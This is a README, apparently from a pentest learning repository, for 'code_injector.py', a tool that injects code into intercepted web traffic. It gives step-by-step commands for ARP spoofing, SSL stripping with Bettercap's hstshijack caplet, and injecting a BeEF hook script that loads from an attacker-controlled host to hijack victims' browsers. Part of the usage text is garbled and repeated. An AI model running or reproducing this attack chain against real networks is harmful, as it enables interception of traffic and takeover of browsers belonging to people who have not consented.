# Code injector

## Requirements

* Root access
* Python 3
* Scapy and NetfilterQueue modules
* BeEF
* Bettercap

## Usage

```shell
usage: code_injector.py [-h] [-d DESTINATION] [-c CODE]

optional arguments:
  -h, --help            show this help message and exit
  -d DESTINATION, --destination DESTINATION
                        Destusage: code_injector.py [-h] [-d DESTINATION] [-c CODE]

Code injector tool (use Bettercap hstshijack/hstshijack for sslstripping)

optional arguments:
  -h, --help            show this help message and exit
  -d DESTINATION, --destination DESTINATION
                        sslstrip, forward, or local
  -c CODE, --code CODE  Code to inject

Example: 
            code_injector.py # via a html file in location apache2 server on Kali, hook browser for BeEF, sslstrip on
```

### Kicking the tyres

Injection code: `<script src="http://192.168.122.108:3000/hook.js"></script>`

* Run the [arp_spoofer.py script](/arp_spoofer)

```shell
    @kali:~$ sudo python3 arp_spoofer.py
    [sudo] password for <user>: 
    [+] Setting forward
    [+] Packets sent: 63
```
* Run `bettercap` (also see the Troubleshooting section below)

```shell
    @kali:~$ sudo bettercap -iface eth0 -caplet hstshijack/hstshijack
```
* Run the `code_injector.py` script for using BeEF 

```shell
kali:~$ sudo python3 code_injector.py -d forward -c '<script src="http://192.168.122.108:3000/hook.js"></script>'
```

And check on Windows machine it works.

## Troubleshooting

* [ImportError on NetfilterQueue](https://github.com/tymyrddin/ymrir/wiki/netfilterqueue.md)
* [ImportError on Scapy](https://github.com/tymyrddin/ymrir/wiki/scapy.md)
* [BeEF unable to load extensions](https://github.com/tymyrddin/ymrir/wiki/beef.md)
* [Bettercap sslstrip not working](https://github.com/tymyrddin/ymrir/wiki/bettercap.md)
* [Undesired HTTPS redirects](https://github.com/tymyrddin/ymrir/wiki/https-browser.md)
* [Correctly configured HSTS](https://github.com/tymyrddin/ymrir/wiki/hsts.md)
